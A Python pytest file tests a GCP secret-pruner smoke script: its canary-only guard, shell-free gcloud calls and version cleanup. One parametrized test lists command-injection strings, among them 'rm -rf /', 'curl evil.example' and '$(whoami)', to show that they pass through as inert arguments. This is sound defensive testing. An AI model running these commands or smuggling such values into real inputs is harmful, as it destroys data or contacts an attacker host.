"""Unit tests for scripts/smoke_test_secret_pruner.py's pure/testable pieces.

This script talks to real GCP (impersonated OIDC, live Secret Manager, live
`gcloud`) for everything else, which is exercised by actually running it (see
its own docstring), not by unit tests. What's tested here is exactly the
logic a live run can't cheaply prove wasn't a fluke:

  - the canary-only guard actually rejects a real secret before any mutation
  - gcloud is never invoked through a shell, regardless of platform or what
    project/region/function-name happen to contain
  - cleanup never leaves the canary's numerically latest version disabled
    (which would trip SECRET_PRUNE_ANOMALY on the very next scheduled run),
    and reports failure rather than silently succeeding when it can't avoid that
"""

import datetime
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "scripts"))
sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "terraform" / "modules" / "secret-maintenance" / "secret_pruner_function"))


@pytest.fixture
def pruner_main(monkeypatch):
    """The deployed function's own module — imported the same way the script
    itself does, so these tests exercise the real plan_destructions, not a
    reimplementation of it."""
    monkeypatch.setenv("GCP_PROJECT_ID", "test-project")
    import main

    return main


@pytest.fixture
def smoke(monkeypatch):
    import smoke_test_secret_pruner as smoke

    monkeypatch.setattr(smoke.time, "sleep", lambda s: None)  # no real waiting in _destroy_with_retry's backoff
    return smoke


def _version(number: int, state: str, secret_id: str = "secret-pruner-canary", pending_destroy: bool = False):
    from google.cloud.secretmanager_v1.types import SecretVersion

    v = SecretVersion()
    v.name = f"projects/test-project/secrets/{secret_id}/versions/{number}"
    v.state = getattr(SecretVersion.State, state)
    v.etag = f"etag-{number}"
    if pending_destroy:
        v.scheduled_destroy_time = datetime.datetime.now(datetime.timezone.utc)
    return v


class _FakeSecretManagerClient:
    """Enough of the real client's surface for _cleanup_and_verify_healthy:
    list + destroy against an in-memory version list, mutated in place so a
    second list_secret_versions call reflects prior destroys — same
    observable behavior as the real API."""

    def __init__(self, versions):
        self._versions = list(versions)
        self.destroy_calls: list[str] = []
        self.fail_destroy_for: set[str] = set()

    def list_secret_versions(self, parent):
        return list(self._versions)

    def destroy_secret_version(self, name=None, request=None):
        from google.api_core.exceptions import FailedPrecondition

        target_name = name or request.name
        if target_name in self.fail_destroy_for:
            raise FailedPrecondition("simulated transient destroy failure")
        self.destroy_calls.append(target_name)
        for v in self._versions:
            if v.name == target_name:
                v.state = type(v.state).DISABLED
                v.scheduled_destroy_time = datetime.datetime.now(datetime.timezone.utc)


# ─── _require_canary_secret ─────────────────────────────────────────────────


def test_canary_secret_path_is_accepted(smoke):
    smoke._require_canary_secret(f"projects/test-project/secrets/{smoke.CANARY_SECRET_ID}")  # must not raise


@pytest.mark.parametrize(
    "secret_id",
    ["stripe-secret-key", "subscriber-jwt-secret", "instagram-access-token", "admin-emails", "not-even-close"],
)
def test_every_non_canary_secret_id_is_rejected_before_any_mutation(smoke, secret_id):
    """The exact regression this guard exists for: pointing this script at a
    real application secret must never reach a mutating call."""
    with pytest.raises(smoke.SmokeTestFailure):
        smoke._require_canary_secret(f"projects/test-project/secrets/{secret_id}")


def test_a_secret_id_that_merely_contains_the_canary_name_is_still_rejected(smoke):
    """Guards against a substring-match bug — only an exact resource path
    ending in the real canary id is acceptable."""
    with pytest.raises(smoke.SmokeTestFailure):
        smoke._require_canary_secret("projects/test-project/secrets/secret-pruner-canary-but-not-really")


# ─── _run_gcloud: no shell, ever ────────────────────────────────────────────


def test_gcloud_is_never_invoked_with_shell_true(smoke, monkeypatch):
    captured = {}

    def _fake_run(argv, **kwargs):
        captured["argv"] = argv
        captured["kwargs"] = kwargs

        class _Result:
            returncode = 0
            stdout = "ok"
            stderr = ""

        return _Result()

    monkeypatch.setattr(smoke.subprocess, "run", _fake_run)
    monkeypatch.setattr(smoke.shutil, "which", lambda name: "/usr/bin/gcloud")

    smoke._run_gcloud(["functions", "describe", "secret-pruner"])

    assert captured["kwargs"]["shell"] is False


@pytest.mark.parametrize(
    "malicious",
    [
        "made-for-seconds; rm -rf /",
        "made-for-seconds && curl evil.example",
        "$(whoami)",
        "`whoami`",
        "made-for-seconds | tee /tmp/pwned",
    ],
)
def test_metacharacter_laden_arguments_pass_through_literally(smoke, monkeypatch, malicious):
    """With shell=False, argv is exec'd directly — there is no shell to
    interpret ; && $() | etc., so a malicious-looking value is just a single,
    inert argument. This proves that property by construction rather than by
    inference from shell=False alone: the exact string must reach argv
    unmodified and untouched by any shell-escaping logic."""
    captured = {}

    def _fake_run(argv, **kwargs):
        captured["argv"] = argv

        class _Result:
            returncode = 0
            stdout = ""
            stderr = ""

        return _Result()

    monkeypatch.setattr(smoke.subprocess, "run", _fake_run)
    monkeypatch.setattr(smoke.shutil, "which", lambda name: "/usr/bin/gcloud")

    smoke._run_gcloud(["--project", malicious])

    assert malicious in captured["argv"]
    assert captured["argv"].count(malicious) == 1  # present verbatim, not split/re-quoted by any shell


def test_missing_gcloud_executable_fails_loudly(smoke, monkeypatch):
    monkeypatch.setattr(smoke.shutil, "which", lambda name: None)
    with pytest.raises(smoke.SmokeTestFailure):
        smoke._run_gcloud(["version"])


# ─── _cleanup_and_verify_healthy ────────────────────────────────────────────


def test_cleanup_destroys_only_what_is_below_the_protected_floor(smoke, pruner_main):
    client = _FakeSecretManagerClient([_version(3, "ENABLED"), _version(2, "ENABLED"), _version(1, "ENABLED")])

    ok = smoke._cleanup_and_verify_healthy(pruner_main, client, "projects/test-project/secrets/secret-pruner-canary")

    assert ok is True
    assert client.destroy_calls == [_version(1, "ENABLED").name]


def test_cleanup_leaves_the_two_newest_versions_enabled(smoke, pruner_main):
    """The property this whole fix exists for: cleanup must never leave the
    canary's numerically latest version disabled, which would trip
    SECRET_PRUNE_ANOMALY on the very next scheduled run."""
    client = _FakeSecretManagerClient([_version(3, "ENABLED"), _version(2, "ENABLED"), _version(1, "ENABLED")])

    smoke._cleanup_and_verify_healthy(pruner_main, client, "projects/test-project/secrets/secret-pruner-canary")

    remaining = {v.name: v.state.name for v in client.list_secret_versions(parent=None)}
    assert remaining[_version(3, "ENABLED").name] == "ENABLED"
    assert remaining[_version(2, "ENABLED").name] == "ENABLED"


def test_cleanup_reports_failure_when_the_canary_is_already_anomalous(smoke, pruner_main):
    """If something left the latest version disabled before cleanup even ran,
    cleanup must report that rather than silently returning success."""
    client = _FakeSecretManagerClient([_version(3, "DISABLED"), _version(2, "ENABLED"), _version(1, "ENABLED")])

    ok = smoke._cleanup_and_verify_healthy(pruner_main, client, "projects/test-project/secrets/secret-pruner-canary")

    assert ok is False


def test_cleanup_reports_failure_when_a_destroy_call_fails(smoke, pruner_main):
    versions = [_version(3, "ENABLED"), _version(2, "ENABLED"), _version(1, "ENABLED")]
    client = _FakeSecretManagerClient(versions)
    client.fail_destroy_for = {versions[2].name}  # version 1, the one that should be destroyed

    ok = smoke._cleanup_and_verify_healthy(pruner_main, client, "projects/test-project/secrets/secret-pruner-canary")

    assert ok is False


def test_cleanup_with_nothing_prunable_is_a_healthy_noop(smoke, pruner_main):
    client = _FakeSecretManagerClient([_version(2, "ENABLED"), _version(1, "ENABLED")])

    ok = smoke._cleanup_and_verify_healthy(pruner_main, client, "projects/test-project/secrets/secret-pruner-canary")

    assert ok is True
    assert client.destroy_calls == []
